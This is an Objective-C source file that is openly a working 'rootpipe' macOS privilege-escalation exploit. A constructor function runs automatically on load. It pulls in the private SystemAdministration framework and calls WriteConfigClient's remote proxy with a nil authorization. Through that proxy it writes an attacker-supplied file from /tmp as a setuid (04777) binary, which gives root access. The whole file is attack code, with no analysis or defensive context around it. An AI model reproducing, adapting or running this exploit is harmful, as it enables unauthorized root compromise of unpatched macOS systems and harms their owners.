#include <objc/runtime.h>
#include <Foundation/Foundation.h>

@interface SFAuthorization : NSObject
+(id)authorization;
@end

@interface WriteConfigClient : NSObject
+(id)sharedClient;
-(void)authenticateUsingAuthorizationSync:(id)auth;
-(id)remoteProxy;
@end

@interface Proxy : NSObject;
-(void)createFileWithContents:(NSData*)data path:(NSString*)path attributes:(NSDictionary *)attributes;
@end

int __attribute__ ((constructor)) exploit(void)
{
    NSString *newPath = @"/tmp/rpe_x";
    
    printf("Running rootpipe exploit\n");
    printf("Loading framework\n");
    NSString *bPath = @"/System/Library/PrivateFrameworks/SystemAdministration.framework";
    
    if (![[NSFileManager defaultManager] fileExistsAtPath:bPath]) {
        printf("[ERROR] Failed to load SystemAdministration.framework\n");
        return -1;
    }
    
    NSBundle *admin = [NSBundle bundleWithPath:bPath];
    if (![admin load]) {
        printf("[Error] loading framework\n");
        return -1;
    }
    
    Class sfauth = objc_lookUpClass("SFAuthorization");
    Class wcc = objc_lookUpClass("WriteConfigClient");
    
    if (!sfauth || !wcc) {
        printf("[Error] getting classes failed\n");
        return -1;
    }
    printf("Loaded successfully\n");
    
    
    WriteConfigClient *sharedClient = [wcc sharedClient];
    
    [sharedClient authenticateUsingAuthorizationSync: nil];
    Proxy *tool = [sharedClient remoteProxy];
    
    NSData *data = [NSData dataWithContentsOfFile:@"/tmp/rpe_y"];
    
    printf("Getting suid flag\n");
    [tool createFileWithContents:data path:newPath attributes:@{ NSFilePosixPermissions : @04777 }];
    sleep(1);
    if (![[NSFileManager defaultManager] fileExistsAtPath:newPath]) {
        printf("[Error] creating file failed\n");
        return -1;
    }
    printf("File created\n");
    exit(0);
}














